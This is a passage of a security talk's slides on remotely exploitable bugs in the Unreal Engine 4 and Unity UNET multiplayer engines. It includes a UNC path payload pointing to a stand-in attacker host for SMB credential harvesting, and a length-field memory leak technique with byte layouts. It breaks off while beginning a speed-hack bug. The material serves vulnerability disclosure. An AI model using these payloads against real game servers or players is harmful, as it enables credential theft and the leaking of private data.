BUGS IN MULTIPLAYER GAME ENGINES
FINDING + EXPLOITING
BACKGROUND
> Over a few months I found 10+ remotely 
exploitable bugs in 2 game engines
> I’m going to talk about 4 of these bugs (2 per 
engine)
GAME 
ENGINES
> The term Game Engine refers to the base 
software on which most video games are created
> The popularity of many game engines means that 
lots of game share the same bugs
> Updating your game engine can be a huge pain
> Games don’t often get “security patches” after 
release
GAME 
ENGINES
> General understanding is that two engines are 
the most common:
> Unreal Engine 4 (Or UE4)
> Unity
> If you’re a solo developer or small team, there’s a 
good chance you’re using Unity
> If you’re a larger team and haven’t built your own 
engine, you’re probably using UE4
UNREAL 
ENGINE 4
> Created by Epic Games
> Named for its roots in the Unreal series
> Open source (With licensing restrictions)
> Notable games:
> Fortnite
> PlayerUnknown’s Battlegrounds (PUBG)
UNITY
> Created by Unity Technologies
> Core components are closed source
> Core networking library is called UNET
> Games using UNET:
> Countless indie releases on Steam
UNET
> UNET is technically deprecated, but Unity 
Technologies has not released an alternative
> UNET still receives patches and even occasional 
new features
> Encryption API was added post-deprecation
> A TON of new and existing games use UNET
MULTIPLAYER 
PROTOCOLS
> The evolution of multiplayer architectures has 
largely focused on two things
> Increasing performance
> Moving trust away from the client 
> These are often conﬂicting goals
MULTIPLAYER 
PROTOCOLS
> To understand multiplayer protocols we should 
understand the attacks they aim to prevent
> A good example of the evolution of multiplayer 
protocols is the evolution of Movement Hacking
MOVEMENT 
HACKING
> One of the oldest and most common types of 
game hack is manipulating the player’s location
> In the good old days, player location was trusted 
to the client
> Manipulate location client-side and we can 
teleport
MOVEMENT 
HACKING
> To prevent this type of attack, authority over 
player location is trusted only to the server
> Instead, clients can make a request to move the 
player and the server can update their position 
accordingly
> This lead to a new type of attack, Speed Hacking
SPEED 
HACKING
> Speed hacking was the next evolution in 
movement hacking where the goal is not to 
teleport, but to move extremely fast
> This typically works by sending a movement 
request excessively fast
> More requests = More speed
SPEED 
HACKING
> Speed hacking is prevented by restraining 
movement server side
> The server knows what is realistic movement 
for a given time frame and prevents anything 
beyond this
MULTIPLAYER PROTOCOL BASICS
DISTRIBUTED 
ARCHITECTURE
> Most multiplayer protocols use some form of 
Distributed Architecture
> Each system (client or server) has a copy of 
each “networked” object in the game world
> Actions are performed and propagated 
through Remote Procedure Calls (RPCs)
REMOTE 
PROCEDURE 
CALLS
> Remote Procedure Calls are used to call 
functions on a remote system as if it were local
> This simpliﬁes things signiﬁcantly for the 
developer
> There’s a lot of complexity that goes into this 
process on the back-end
OBJECT 
OWNERSHIP
> Multiplayer protocols typically have some 
concept of ownership
> Owning an object means having the authority to 
issue RPCs on that object
> Each player has ownership over their character 
and associated subobjects
> Player A can issues RPCs on Character A, but 
not Character B
MULTIPLAYER 
PROTOCOLS
> For performance, most multiplayer protocols are 
implemented over UDP
> Browser games are the main exception here
> This puts extra requirements on the protocol:
> Validate packet sender
> Identify duplicate or out-of-order packets
UE4 ARBITRARY FILE ACCESS
BUG #1
UE4 URLS
> UE4 uses its own type of "URL" to communicate 
details between server and client. This includes:
> Package names (Such as loading maps or 
other assets)
> Client information (Player name, how many 
split-screen players are on one client)
127.0.0.1//Game/ThirdPersonCPP/Maps/ThirdPersonExampleMap?Name=Player
UE4 URLS
> A malicious URL can cause a server or client to 
access any local ﬁle path
> This is boring, unless we use Universal Naming 
Convention (UNC) paths
> UNC paths are special Windows paths used to 
access networked resources like regular ﬁles
> They typically look like this:
\\hostname\sharename\ﬁlename
UE4 URLS
> We can cause a server or client to connect to a 
remote SMB share with the following URL:
\\asdf.umap.attacker.com\hi\hi.txt
UE4 URLS
> This opens affected servers/clients up to the 
world of SMB-related attacks
> Credential harvesting
> Authentication relaying
> Can also be used as a server DoS
> Fixed in UE4.25.2 with commit 
cdfe253a5db58d8d525dd50be820e8106113a746
UNET MEMORY DISCLOSURE
BUG #2
UNET 
MEMORY 
DISCLOSURE
> UNET packets are packed in a format that can 
allow for multiple RPCs in a single packet
Packet Header
16-bit Msg Len
16-bit Msg Type
Msg Body
16-bit Msg Len
16-bit Msg Type
Msg Body
M
S
G  
1
M
S
G
2
UNET 
MEMORY 
DISCLOSURE
> If we supply a message size ﬁeld larger than our 
actual payload, the server will act on extra data 
already in memory
04
00
05
00
41
42
43
44
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
LENGTH
BODY
1C
00
05
00
41
42
43
44
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
LENGTH
UNET 
MEMORY 
DISCLOSURE
> This old memory comes from past RPCs, 
including those from other connections
> We can create an RPC that will leak this memory 
to us Heartbleed-style
UNET 
MEMORY 
DISCLOSURE
> To leak memory we need an RPC that will trigger 
a response with data from our malformed RPC
> Chat messages are typically the perfect RPC for 
this
04
00
05
00
02
00
41
42
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
LENGTH
STRING BODY
STRING LEN
1C
00
05
00
1A
00
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
XX
LENGTH
STRING LEN
UNET 
MEMORY 
DISCLOSURE
> Other types of RPCs we might use:
> Movement
> Spawning a new object
> Other game speciﬁc commands
UNET 
MEMORY 
DISCLOSURE
> What can we leak?
> Passwords
> Private messages
> Player locations/actions
> ... really anything sent over UNET
> Fixed in UNET version 1.0.6
UE4 UNIVERSAL SPEED HACK
BUG #3
UE4 
MOVEMENT
> UE4 movement is server-authoritative
> Client cannot directly dictate the player’s 
position
> To move the character, the client issues a 
movement RPC
MOVEMENT 
RPC
> The movement RPC has two important 
arguments (We’re simplifying a bit)
> The movement vector
> A vector dictating the direction and speed of 
movement
> A timestamp of when the RPC is issued
> Represented as a 32-bit ﬂoat
// Calculate the time since last movement
MovementDelta = CurrentTimestamp - LastTimestamp
// Calculate the distance moved in this time
AppliedMovement = MovementVector * MovementDelta
FLOATING 